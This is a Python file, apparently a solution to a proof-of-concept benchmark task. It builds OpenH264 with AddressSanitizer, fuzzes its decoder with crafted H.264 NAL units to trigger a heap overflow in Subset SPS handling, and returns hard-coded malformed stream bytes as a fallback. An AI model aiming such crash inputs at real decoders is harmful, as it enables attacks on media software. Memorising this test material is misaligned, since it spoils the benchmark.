import os
import sys
import subprocess
import tarfile
import shutil
import random
import time
import struct
from concurrent.futures import ThreadPoolExecutor

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create working directory
        base_dir = os.getcwd()
        work_dir = os.path.join(base_dir, "work_dir_" + str(int(time.time())))
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        os.makedirs(work_dir)
        
        # Extract source code
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(work_dir)
        except Exception:
            return self.fallback_poc()
            
        # Locate project root
        project_root = work_dir
        entries = os.listdir(work_dir)
        if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
            project_root = os.path.join(work_dir, entries[0])
            
        # Compile OpenH264 with ASAN
        # The goal is to detect heap buffer overflow, so ASAN is critical
        env = os.environ.copy()
        sanitizers = "-fsanitize=address"
        
        # OpenH264 Makefile supports 'make'. We inject flags via CFLAGS_OPT/LDFLAGS
        # We also disable ASM to avoid potential nasm dependency issues in the eval environment
        build_success = False
        try:
            cmd = [
                "make", "-j8", "OS=linux", "ARCH=x86_64", "ASM=No",
                f"CFLAGS_OPT={sanitizers} -g", 
                f"LDFLAGS={sanitizers}"
            ]
            subprocess.check_call(cmd, cwd=project_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            build_success = True
        except subprocess.CalledProcessError:
            # Fallback to default build if ASAN build fails (though crash detection will be harder)
            try:
                subprocess.check_call(["make", "-j8", "OS=linux", "ARCH=x86_64", "ASM=No"], cwd=project_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                build_success = True
            except:
                pass
                
        if not build_success:
            return self.fallback_poc()

        # Locate the decoder binary
        binary_path = None
        for root, dirs, files in os.walk(project_root):
            if "h264dec" in files:
                binary_path = os.path.join(root, "h264dec")
                break
            if "svcdec" in files:
                binary_path = os.path.join(root, "svcdec")
                break
        
        if not binary_path or not os.access(binary_path, os.X_OK):
            return self.fallback_poc()
            
        # Prepare execution environment
        run_env = env.copy()
        run_env["LD_LIBRARY_PATH"] = project_root + ":" + run_env.get("LD_LIBRARY_PATH", "")
        
        # Construct Seed
        # Vulnerability involves mismatch between decoder display dimensions and subset sequence dimensions.
        # We create a valid H.264 stream and then inject a SubsetSPS (Type 15) with modified content.
        
        # Standard SPS (Type 7) - 16x16 (minimal)
        # 67: Forbidden=0, Ref=3, Type=7
        # 42: Profile Baseline (66)
        # 00: Constraints
        # 0a: Level 1.0
        # f8 41 a2: Exp-Golomb encoded params (seq_id=0, dims, etc.)
        nal_sps = b'\x00\x00\x00\x01\x67\x42\x00\x0a\xf8\x41\xa2'
        
        # PPS (Type 8)
        nal_pps = b'\x00\x00\x00\x01\x68\xce\x38\x80'
        
        # Subset SPS (Type 15)
        # Header: 6F (Forbidden=0, Ref=3, Type=15)
        # Payload: Clone of SPS but we will mutate it to change dimensions or extension
        # We start with a slightly different payload to encourage mismatch
        # Changing \xf8 to \x88 changes the exp-golomb values significantly
        subset_payload = b'\x42\x00\x0a\x88\x41\xa2' + b'\x00' * 50
        nal_subset = b'\x00\x00\x00\x01\x6f' + subset_payload
        
        # IDR Slice (Type 5)
        nal_slice = b'\x00\x00\x00\x01\x65\xb8\x00\x04\x00\x00\x03\x00\x04\x00\x00\x03\x00\xc4\x80'
        
        # Combine into seed
        seed = nal_sps + nal_pps + nal_subset + nal_slice + nal_subset + nal_slice
        
        # Fuzzing Strategy
        self.found_poc = None
        self.start_time = time.time()
        # Allow 45 seconds for fuzzing
        self.timeout = 45 
        
        def fuzz_worker(idx):
            rng = random.Random(idx + time.time())
            local_seed = bytearray(seed)
            tmp_in = os.path.join(work_dir, f"fuzz_{idx}.264")
            tmp_out = os.path.join(work_dir, f"fuzz_{idx}.yuv")
            
            while time.time() - self.start_time < self.timeout:
                if self.found_poc:
                    break
                
                # Mutate
                curr = bytearray(local_seed)
                # Mutation 1: Random bitflips
                num_flips = rng.randint(1, 10)
                for _ in range(num_flips):
                    pos = rng.randint(0, len(curr) - 1)
                    curr[pos] ^= (1 << rng.randint(0, 7))
                
                # Mutation 2: Byte overwrites in the Subset SPS area (likely around index 20-50)
                if rng.random() < 0.3:
                    pos = rng.randint(20, min(80, len(curr)-1))
                    curr[pos] = rng.randint(0, 255)

                # Write to file
                with open(tmp_in, "wb") as f:
                    f.write(curr)
                
                # Run decoder
                # usage: ./h264dec input output
                try:
                    proc = subprocess.run(
                        [binary_path, tmp_in, tmp_out],
                        cwd=project_root,
                        env=run_env,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=1.0
                    )
                    
                    # Check for crash
                    # ASAN returns non-zero (often 1 or 23 or -11 for SEGV)
                    # Normal error in stream usually returns 0 in openh264 console unless fatal,
                    # but sanitizers force exit code.
                    if proc.returncode != 0:
                        self.found_poc = bytes(curr)
                        break
                except subprocess.TimeoutExpired:
                    pass
                except Exception:
                    pass
            
            # Cleanup
            if os.path.exists(tmp_in): os.remove(tmp_in)
            if os.path.exists(tmp_out): os.remove(tmp_out)

        # Run threads
        with ThreadPoolExecutor(max_workers=8) as executor:
            list(executor.map(fuzz_worker, range(8)))
            
        # Cleanup
        try:
            shutil.rmtree(work_dir)
        except:
            pass
            
        if self.found_poc:
            return self.found_poc
        else:
            return self.fallback_poc()

    def fallback_poc(self):
        # A static guess if fuzzing fails
        # Constructed to look like a valid structure with potentially conflicting parameters
        sps = b'\x00\x00\x00\x01\x67\x42\x00\x0a\xf8\x41\xa2'
        pps = b'\x00\x00\x00\x01\x68\xce\x38\x80'
        # Subset SPS with corrupted dimensions
        subset = b'\x00\x00\x00\x01\x6f\x42\x00\x0a\x85\x00\x00' + b'\x00' * 100
        slc = b'\x00\x00\x00\x01\x65\xb8\x00\x04\x00\x00\x03\x00\x04\x00\x00\x03\x00\xc4\x80'
        return sps + pps + subset + slc